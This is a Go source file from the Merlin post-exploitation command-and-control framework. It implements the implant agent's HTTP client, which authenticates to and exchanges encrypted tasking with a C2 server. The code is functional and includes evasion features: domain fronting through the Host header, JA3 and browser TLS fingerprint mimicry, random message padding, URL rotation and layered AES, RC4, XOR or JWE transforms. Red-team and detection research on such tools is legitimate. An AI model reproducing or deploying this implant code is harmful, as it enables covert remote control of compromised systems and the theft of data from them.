//go:build http || http1 || http2 || http3 || winhttp || mythic || !(smb || tcp || udp)

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package http implements the Client interface and contains the structures and functions to communicate to the Merlin
// server over the HTTP protocol
package http

import (
	// Standard
	"bytes"
	"crypto/sha256"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	// 3rd Party
	"github.com/go-jose/go-jose/v3"
	"github.com/go-jose/go-jose/v3/jwt"
	"github.com/google/uuid"

	// Merlin Message
	"github.com/Ne0nd0g/merlin-message"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/authenticators"
	"github.com/Ne0nd0g/merlin-agent/v2/authenticators/none"
	oAuth "github.com/Ne0nd0g/merlin-agent/v2/authenticators/opaque"
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/memory"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	merlinHTTP "github.com/Ne0nd0g/merlin-agent/v2/http"
	"github.com/Ne0nd0g/merlin-agent/v2/services/p2p"
	transformer "github.com/Ne0nd0g/merlin-agent/v2/transformers"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/base64"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/gob"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/hex"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/aes"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/jwe"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/rc4"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/xor"
)

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	Authenticator authenticators.Authenticator
	authenticated bool              // authenticated tracks if the Agent has successfully authenticated
	Client        merlinHTTP.Client // Client to send messages with
	ClientType    merlinHTTP.Type
	Protocol      string                    // Protocol contains the transportation protocol the agent is using (i.e., http2 or smb-reverse)
	URL           []string                  // A slice of URLs to send messages to (e.g., https://127.0.0.1:443/test.php)
	Host          string                    // HTTP Host header value
	Proxy         string                    // Proxy string
	ProxyUser     string                    // ProxyUser string
	ProxyPass     string                    // ProxyPass string
	JWT           string                    // JSON Web Token for authorization
	Headers       map[string]string         // Additional HTTP headers to add to the request
	secret        []byte                    // The secret key used to encrypt communications
	UserAgent     string                    // HTTP User-Agent value
	PaddingMax    int                       // PaddingMax is the maximum size allowed for a randomly selected message padding length
	Parrot        string                    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
	JA3           string                    // JA3 is a string that represents how the TLS client should be configured, if applicable
	psk           string                    // psk is the Pre-Shared Key secret the agent will use to start authentication
	AgentID       uuid.UUID                 // AgentID the Agent's unique identifier
	currentURL    int                       // the current URL the agent is communicating with
	transformers  []transformer.Transformer // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
	insecureTLS   bool                      // insecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
	sync.Mutex
}

// Config is a structure used to pass in all necessary information to instantiate a new Client
type Config struct {
	AgentID      uuid.UUID // AgentID the Agent's UUID
	Protocol     string    // Protocol contains the transportation protocol the agent is using (i.e., http2 or smb-reverse)
	Host         string    // Host is used with the HTTP Host header for Domain Fronting activities
	Headers      string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
	URL          []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
	Proxy        string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
	ProxyUser    string    // ProxyUser is the username for the proxy, if applicable
	ProxyPass    string    // ProxyPass is the password for the proxy, if applicable
	UserAgent    string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
	Parrot       string    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
	PSK          string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
	JA3          string    // JA3 is a string that represents how the TLS client should be configured, if applicable
	Padding      string    // Padding is the max amount of data that will be randomly selected and appended to every message
	AuthPackage  string    // AuthPackage is the type of authentication the agent should use when communicating with the server
	Opaque       []byte    // Opaque is the byte representation of the EnvU object used with the OPAQUE protocol (future use)
	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
	InsecureTLS  bool      // InsecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
	ClientType   string    // ClientType is the type of WINDOWS http client to use (e.g., WinINet, WinHTTP, etc.)
}

// New instantiates and returns a Client constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.http.New()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
	client := Client{
		AgentID:     config.AgentID,
		URL:         config.URL,
		UserAgent:   config.UserAgent,
		Host:        config.Host,
		Protocol:    config.Protocol,
		Proxy:       config.Proxy,
		JA3:         config.JA3,
		Parrot:      config.Parrot,
		psk:         config.PSK,
		insecureTLS: config.InsecureTLS,
		ProxyUser:   config.ProxyUser,
		ProxyPass:   config.ProxyPass,
	}

	// Authenticator
	switch strings.ToLower(config.AuthPackage) {
	case "none":
		client.Authenticator = none.New(config.AgentID)
	case "opaque":
		client.Authenticator = oAuth.New(config.AgentID)
	default:
		return nil, fmt.Errorf("an authenticator must be provided (e.g., 'none' or 'opaque'")
	}

	// Transformers
	transforms := strings.Split(config.Transformers, ",")
	for _, transform := range transforms {
		var t transformer.Transformer
		switch strings.ToLower(transform) {
		case "aes":
			t = aes.NewEncrypter()
		case "base64-byte":
			t = base64.NewEncoder(base64.BYTE)
		case "base64-string":
			t = base64.NewEncoder(base64.STRING)
		case "gob-base":
			t = gob.NewEncoder(gob.BASE)
		case "gob-string":
			t = gob.NewEncoder(gob.STRING)
		case "hex-byte":
			t = hex.NewEncoder(hex.BYTE)
		case "hex-string":
			t = hex.NewEncoder(hex.STRING)
		case "jwe":
			t = jwe.NewEncrypter()
		case "rc4":
			t = rc4.NewEncrypter()
		case "xor":
			t = xor.NewEncrypter()
		default:
			err := fmt.Errorf("clients/http.New(): unhandled transform type: %s", transform)
			if err != nil {
				return nil, err
			}
		}
		client.transformers = append(client.transformers, t)
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(client.psk))
	client.secret = k[:]
	cli.Message(cli.DEBUG, fmt.Sprintf("new client PSK: %s", client.psk))
	cli.Message(cli.DEBUG, fmt.Sprintf("new client Secret: %x", client.secret))

	//Convert Padding from string to an integer
	var err error
	if config.Padding != "" {
		client.PaddingMax, err = strconv.Atoi(config.Padding)
		if err != nil {
			return &client, fmt.Errorf("there was an error converting the padding max to an integer:\r\n%s", err)
		}
	} else {
		client.PaddingMax = 0
	}

	// Parse additional HTTP Headers
	if config.Headers != "" {
		client.Headers = make(map[string]string)
		for _, header := range strings.Split(config.Headers, "\n") {
			h := strings.Split(header, ":")
			if len(h) < 2 {
				cli.Message(cli.DEBUG, fmt.Sprintf("unable to parse HTTP header: '%s'", header))
				continue
			}
			// Remove leading or trailing spaces
			headerKey := strings.TrimSuffix(strings.TrimPrefix(h[0], " "), " ")
			headerValue := strings.TrimSuffix(strings.TrimPrefix(h[1], " "), " ")
			cli.Message(
				cli.DEBUG,
				fmt.Sprintf("HTTP Header (%d): %s, Value (%d): %s\n",
					len(headerKey),
					headerKey,
					len(headerValue),
					headerValue,
				),
			)
			client.Headers[headerKey] = headerValue
		}
	}

	// Determine the HTTP client type
	if client.Protocol == "http" || client.Protocol == "https" {
		if config.ClientType == strings.ToLower("winhttp") {
			client.ClientType = merlinHTTP.WINHTTP
		} else if config.ClientType == strings.ToLower("wininet") {
			client.ClientType = merlinHTTP.WININET
		} else {
			client.ClientType = merlinHTTP.HTTP
		}
	}

	if client.Protocol == "h2" || client.Protocol == "h2c" {
		client.ClientType = merlinHTTP.HTTP2
	}

	if client.Protocol == "http3" {
		client.ClientType = merlinHTTP.HTTP3
	}

	// If JA3 or Parrot was set, override the client type forcing HTTP/1.1 using the uTLS client
	if client.JA3 != "" {
		client.ClientType = merlinHTTP.JA3
	} else if client.Parrot != "" {
		client.ClientType = merlinHTTP.PARROT
	}

	// Build HTTP client config
	httpConfig := merlinHTTP.Config{
		ClientType: client.ClientType,
		Insecure:   client.insecureTLS,
		JA3:        client.JA3,
		Parrot:     client.Parrot,
		Protocol:   client.Protocol,
		ProxyURL:   client.Proxy,
		ProxyUser:  client.ProxyUser,
		ProxyPass:  client.ProxyPass,
	}

	// Get the HTTP client
	client.Client, err = merlinHTTP.NewHTTPClient(httpConfig)
	if err != nil {
		return &client, err
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Client Type: %s", client.ClientType))
	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.Authenticator))
	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %v", client.URL))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Headers: %s", client.Headers))
	cli.Message(cli.INFO, fmt.Sprintf("\tProxy: %s", client.Proxy))
	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))
	cli.Message(cli.INFO, fmt.Sprintf("\tParrot String: %s", client.Parrot))

	// Add the client to the repository
	memory.NewRepository().Add(&client)

	return &client, nil
}

// getJWT is used to generate unauthenticated JWTs before the Agent successfully authenticates to the server
func (client *Client) getJWT() (string, error) {
	cli.Message(cli.DEBUG, "Entering into clients.http.getJWT()...")
	// Agent generated JWT will always use the PSK
	// Server later signs and returns JWTs

	key := sha256.Sum256([]byte(client.psk))

	// Create encrypter
	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
		jose.Recipient{
			Algorithm: jose.DIRECT, // Doesn't create a per-message key
			Key:       key[:]},
		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
	if encErr != nil {
		return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
	}

	// Create signer
	signer, errSigner := jose.NewSigner(jose.SigningKey{
		Algorithm: jose.HS256,
		Key:       key[:]},
		(&jose.SignerOptions{}).WithType("JWT"))
	if errSigner != nil {
		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
	}

	// Build JWT claims
	cl := jwt.Claims{
		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
		ID:       client.AgentID.String(),
	}

	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
	if err != nil {
		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
	}

	// Parse it to check for errors
	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
	if errParse != nil {
		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
	}

	return agentJWT, nil
}

// Listen waits for incoming data on an established connection, deconstructs the data into a Base messages, and returns them
func (client *Client) Listen() (returnMessages []messages.Base, err error) {
	err = fmt.Errorf("clients/http.Listen(): the HTTP client does not support the Listen function")
	return
}

func (client *Client) proxy() (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.proxy(): Sending CONNECT request to proxy: %s", client.Proxy))
	fmt.Printf("clients/http.proxy(): client.URL: %+v\n", client.URL[client.currentURL])

	req, err := http.NewRequest("CONNECT", client.URL[client.currentURL], nil)
	if err != nil {
		err = fmt.Errorf("there was an error building the HTTP CONNECT request: %s", err)
		return
	}

	var resp *http.Response
	resp, err = client.Client.Do(req)
	if err != nil {
		err = fmt.Errorf("there was an error sending the HTTP CONNECT request: %s", err)
		return
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.proxy(): HTTP CONNECT response: %+v", resp))
	return
}

// Send takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server.
// The function also decodes and decrypts response messages and returns a Merlin message structure.
// This is where the client's logic is for communicating with the server.
func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Send(): Entering into function with message: %+v", m))
	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s", m.Type, client.URL[client.currentURL]))

	// Set the message padding
	if client.PaddingMax > 0 {
		// #nosec G404 -- Random number does not impact security
		m.Padding = core.RandStringBytesMaskImprSrc(rand.Intn(client.PaddingMax))
	}

	// Construct the message running it through all the configured transforms
	data, err := client.Construct(m)
	if err != nil {
		err = fmt.Errorf("clients/http.Send(): there was an error constructing the message: %s", err)
		return
	}

	// Build the POST request
	req, reqErr := http.NewRequest("POST", client.URL[client.currentURL], bytes.NewReader(data))
	if reqErr != nil {
		err = fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		return
	}

	if req != nil {
		req.Header.Set("User-Agent", client.UserAgent)
		req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", client.JWT))
		if client.Host != "" {
			req.Host = client.Host
		}
	}
	for header, value := range client.Headers {
		req.Header.Set(header, value)
	}

	// Send the request
	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL[client.currentURL]))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
	resp, err := client.Client.Do(req)

	// Must rotate URL before error check to keep the URL from getting stuck on the same server
	if client.Authenticator.String() == "OPAQUE" && len(client.secret) != 64 {
		// Don't rotate URL until OPAQUE registration/authentication is complete
		// AES PSK is 32-bytes but OPAQUE PSK is 64-bytes
		// Don't do anything
	} else if len(client.URL) > 1 {
		// Randomly rotate URL for the NEXT request
		client.currentURL = rand.Intn(len(client.URL)) // #nosec G404 random number is not used for secrets

		// Sequentially rotate URL for the NEXT request
		//if client.currentURL < (len(client.URL) - 1) {
		//	client.currentURL++
		//}
		cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Send(): Rotating URL to: %s", client.URL[client.currentURL]))
	}

	if err != nil {
		// Handle HTTP3 Errors
		if client.Protocol == "http3" {
			e := ""
			n := false

			// Application error 0x0 is typically the result of the server sending a CONNECTION_CLOSE frame
			if strings.Contains(err.Error(), "Application error 0x0") {
				n = true
				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
			}

			// Handshake timeout happens when a new client was not able to reach the server and set up a crypto handshake for the first time (no listener or no access)
			if strings.Contains(err.Error(), "NO_ERROR: Handshake did not complete in time") {
				n = true
				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
			}

			// No recent network activity happens when a PING timeout occurs.
			// KeepAlive setting can be used to prevent MaxIdleTimeout.
			// When the client has previously established a crypto handshake, but does not hear back from its PING frame,
			// the server within the client's MaxIdleTimeout.
			// Typically, it happens when the Merlin Server application is killed/quit without sending a
			// CONNECTION_CLOSE frame from stopping the listener.
			if strings.Contains(err.Error(), "NO_ERROR: No recent network activity") {
				n = true
				e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
			}

			cli.Message(cli.DEBUG, fmt.Sprintf("HTTP/3 error: %s", err.Error()))

			if n {
				cli.Message(cli.NOTE, e)
				var errClient error
				// Build HTTP client config
				httpConfig := merlinHTTP.Config{
					ClientType: client.ClientType,
					Insecure:   client.insecureTLS,
					JA3:        client.JA3,
					Parrot:     client.Parrot,
					Protocol:   client.Protocol,
					ProxyURL:   client.Proxy,
					ProxyUser:  client.ProxyUser,
					ProxyPass:  client.ProxyPass,
				}
				client.Client, errClient = merlinHTTP.NewHTTPClient(httpConfig)
				if errClient != nil {
					cli.Message(cli.WARN, fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
				}
			}
		}
		err = fmt.Errorf("there was an error with the http client while performing a POST:\r\n%s", err.Error())
		return
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Response:\r\n%+v", resp))

	switch resp.StatusCode {
	case 200:
		break
	case 401:
		cli.Message(cli.NOTE, "Server returned a 401, generating JWT with PSK and trying again...")
		client.JWT, err = client.getJWT()
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("clients/http.Send(): there was an error generating a self-signed JWT: %s", err))
		}
		return
	case 407:
		cli.Message(cli.NOTE, "Server returned a 407 - Proxy Authentication Required, trying again...")
		cli.Message(cli.DEBUG, fmt.Sprintf("Proxy-Authenticate header: %s", resp.Header.Get("Proxy-Authenticate")))
		return
	default:
		err = fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
		return
	}

	contentType := resp.Header.Get("Content-Type")
	if contentType == "" {
		err = fmt.Errorf("the response did not contain a Content-Type header")
		return
	}

	// Check to make sure the response contains the application/octet-stream Content-Type header
	isOctet := false
	for _, v := range strings.Split(contentType, ",") {
		if strings.ToLower(v) == "application/octet-stream" {
			isOctet = true
		}
	}

	if !isOctet {
		err = fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
		return
	}

	// Check to make sure message response contained data
	if resp.ContentLength == 0 {
		err = fmt.Errorf("the response message did not contain any data")
		return
	}

	data, err = io.ReadAll(resp.Body)
	if err != nil {
		err = fmt.Errorf("clients/http.Send(): there was an error reading the response body to bytes: %s", err)
		return
	}

	var respMessage messages.Base
	respMessage, err = client.Deconstruct(data)
	if err != nil {
		err = fmt.Errorf("clients/http.Send(): there was an error deconstructing the HTTP response data: %s", err)
		return
	}

	// Update the Agent's JWT if the server returned one in the response message
	if respMessage.Token != "" {
		client.JWT = respMessage.Token
	}

	returnMessages = append(returnMessages, respMessage)
	return
}

// Set is a generic function used to modify a Client's field values
func (client *Client) Set(key string, value string) (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Set(): entering into function with key: %s, value: %s", key, value))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Set(): exiting function with err: %v", err))

	client.Lock()
	defer client.Unlock()

	switch strings.ToLower(key) {
	case "addr":
		// Parse the string for a comma seperated list of URLs
		urls := strings.Split(strings.ReplaceAll(value, " ", ""), ",")
		// Validate each URL
		for _, u := range urls {
			_, err = url.Parse(u)
			if err != nil {
				err = fmt.Errorf("clients/http.Set(): there was an error parsing the URL %s: %s", u, err)
				return
			}
		}
		client.URL = urls
		// Build HTTP client config
		httpConfig := merlinHTTP.Config{
			ClientType: client.ClientType,
			Insecure:   client.insecureTLS,
			JA3:        client.JA3,
			Parrot:     client.Parrot,
			Protocol:   client.Protocol,
			ProxyURL:   client.Proxy,
			ProxyUser:  client.ProxyUser,
			ProxyPass:  client.ProxyPass,
		}
		client.Client, err = merlinHTTP.NewHTTPClient(httpConfig)
	case "ja3":
		ja3String := strings.Trim(value, "\"'")
		if ja3String != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
		} else if ja3String == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.JA3 = ja3String
		// Build HTTP client config
		httpConfig := merlinHTTP.Config{
			ClientType: client.ClientType,
			Insecure:   client.insecureTLS,
			JA3:        client.JA3,
			Parrot:     client.Parrot,
			Protocol:   client.Protocol,
			ProxyURL:   client.Proxy,
			ProxyUser:  client.ProxyUser,
			ProxyPass:  client.ProxyPass,
		}
		client.Client, err = merlinHTTP.NewHTTPClient(httpConfig)
	case "jwt":
		// TODO Parse the JWT to make sure it is valid first
		client.JWT = value
	case "parrot":
		parrot := strings.Trim(value, "\"'")
		if parrot != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent HTTP transport parrot to:%s", parrot))
		} else if parrot == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.Parrot = parrot
		// Build HTTP client config
		httpConfig := merlinHTTP.Config{
			ClientType: client.ClientType,
			Insecure:   client.insecureTLS,
			JA3:        client.JA3,
			Parrot:     client.Parrot,
			Protocol:   client.Protocol,
			ProxyURL:   client.Proxy,
			ProxyUser:  client.ProxyUser,
			ProxyPass:  client.ProxyPass,
		}
		client.Client, err = merlinHTTP.NewHTTPClient(httpConfig)
	case "paddingmax":
		client.PaddingMax, err = strconv.Atoi(value)
	case "secret":
		client.secret = []byte(value)
	default:
		err = fmt.Errorf("unknown http client setting: %s", key)
	}
	return
}

// Get is a generic function used to retrieve the value of a Client's field
func (client *Client) Get(key string) (value string) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Get(): entering into function with key: %s", key))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Get(): leaving function with value: %s", value))
	switch strings.ToLower(key) {
	case "ja3":
		value = client.JA3
	case "paddingmax":
		value = strconv.Itoa(client.PaddingMax)
	case "parrot":
		value = client.Parrot
	case "protocol":
		value = client.Protocol
	default:
		value = fmt.Sprintf("unknown client configuration setting: %s", key)
	}
	return
}

// Authenticate is the top-level function used to authenticate an agent to server using a specific authentication protocol
// The function must take in a Base message for when the C2 server requests re-authentication through a message
func (client *Client) Authenticate(msg messages.Base) (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Authenticate(): entering into function with message: %+v", msg))
	client.authenticated = false
	var authenticated bool
	// Reset the Agent's PSK
	k := sha256.Sum256([]byte(client.psk))
	client.secret = k[:]

	// Add Agent generated JWT from Agent's PSK
	client.JWT, err = client.getJWT()
	if err != nil {
		return
	}

	// Repeat until authenticator is complete and Agent is authenticated
	for {
		msg, authenticated, err = client.Authenticator.Authenticate(msg)
		if err != nil {
			return
		}
		// An empty message was received indicating to exit the function
		if msg.Type == 0 {
			return
		}

		// Once authenticated, update the client's secret used to encrypt messages
		if authenticated {
			client.authenticated = true
			p2p.NewP2PService().Refresh()
			var key []byte
			key, err = client.Authenticator.Secret()
			if err != nil {
				return
			}
			// Don't update the secret if the authenticator returned an empty key
			if len(key) > 0 {
				client.secret = key
			}
		}

		// Send the message to the server
		var msgs []messages.Base
		msgs, err = client.Send(msg)
		if err != nil {
			return
		}

		// Add a response message to the next loop iteration
		if len(msgs) > 0 {
			msg = msgs[0]
		}

		// If the Agent is authenticated, exit the loop and return the function
		if authenticated {
			return
		}
	}
}

// Construct takes in a messages.Base structure that is ready to be sent to the server and runs all the configured transforms
// on it to encode and encrypt it. Transforms will go from last in the slice to first in the slice
func (client *Client) Construct(msg messages.Base) (data []byte, err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Construct(): entering into function with message: %+v", msg))
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Construct(): Transformers: %+v", client.transformers))
	for i := len(client.transformers); i > 0; i-- {
		if i == len(client.transformers) {
			// The first call should always take a Base message
			data, err = client.transformers[i-1].Construct(msg, client.secret)
			cli.Message(cli.DEBUG, fmt.Sprintf("%d call with transform %s - Constructed data(%d) %T: %X\n", i, client.transformers[i-1], len(data), data, data))
		} else {
			data, err = client.transformers[i-1].Construct(data, client.secret)
			cli.Message(cli.DEBUG, fmt.Sprintf("%d call with transform %s - Constructed data(%d) %T: %X\n", i, client.transformers[i-1], len(data), data, data))
		}
		if err != nil {
			return nil, fmt.Errorf("clients/http.Construct(): there was an error calling the transformer construct function: %s", err)
		}
	}
	return
}

// Deconstruct takes in data returned from the server and runs all the Agent's transforms on it until
// a messages.Base structure is returned. The key is used for decryption transforms
func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Deconstruct(): entering into function with message: %+v", data))

	for _, transform := range client.transformers {
		//fmt.Printf("Transformer %T: %+v\n", transform, transform)
		ret, err := transform.Deconstruct(data, client.secret)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("clients/http.Deconstruct(): unable to deconstruct with Agent's secret, retrying with PSK"))
			// Try to see if the PSK works
			k := sha256.Sum256([]byte(client.psk))
			ret, err = transform.Deconstruct(data, k[:])
			if err != nil {
				return messages.Base{}, err
			}
			// If the PSK worked, assume the agent is unauthenticated to the server
			client.authenticated = false
			client.secret = k[:]
		}
		switch ret.(type) {
		case []uint8:
			data = ret.([]byte)
		case string:
			data = []byte(ret.(string)) // Probably not what I should be doing
		case messages.Base:
			//fmt.Printf("pkg/listeners.Deconstruct(): returning Base message: %+v\n", ret.(messages.Base))
			return ret.(messages.Base), nil
		default:
			return messages.Base{}, fmt.Errorf("clients/http.Deconstruct(): unhandled data type for Deconstruct(): %T", ret)
		}
	}
	return messages.Base{}, fmt.Errorf("clients/http.Deconstruct(): unable to transform data into messages.Base structure")
}

// Initial contains all the steps the agent and/or the communication profile need to take to set up and initiate
// communication with the server.
// If the agent needs to authenticate before it can send messages, that process will occur here.
func (client *Client) Initial() (err error) {
	cli.Message(cli.DEBUG, "clients/http.Initial(): entering into function")
	return client.Authenticate(messages.Base{})
}

// Synchronous identifies if the client connection is synchronous or asynchronous, used to determine how and when messages
// can be sent/received.
func (client *Client) Synchronous() bool {
	return false
}
